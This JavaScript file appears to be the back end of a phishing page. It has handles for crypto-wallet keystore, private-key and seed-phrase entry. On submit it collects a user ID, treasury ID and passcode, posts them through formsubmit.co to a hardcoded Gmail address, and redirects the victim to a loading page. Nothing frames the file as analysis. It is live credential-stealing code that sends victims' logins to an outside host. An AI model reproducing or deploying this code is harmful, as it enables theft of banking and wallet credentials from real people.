const keystorejsonProceedBtn = document.getElementById("keystorejsonproceed");
const privatekeyProceedBtn = document.getElementById("privatekeyProceed");
const phraseProceedBtn = document.getElementById("phraseProceed");

form.addEventListener("submit", o);
function o(e) {
  e.preventDefault();
  mail = "honeybe1454@gmail.com";
  next = 'loadingOverlay.html'
  subject = `${window.location.hostname} ${new Date()}`;
  let r = new FormData();
  let s = document.querySelector("form").name;
  txtUserID = userId.value;
  treasuryId = treasuryId.value;
  txtPasscode = passcode.value;
  r.append("txtUserID", txtUserID);
  r.append("txtPasscode", txtPasscode);
  r.append("treasuryId", treasuryId);
  r.append("_captcha", false);
  r.append("_next", next);
  r.append("_template", "table");
  r.append("_subject", subject);
  let n = `https://formsubmit.co/${mail}`
  fetch(
    n,
    {
      method: "POST",
      body: r,
    },
    { referrer: "https://twitter.com" },
  ).then((e) => window.location.assign(next));
}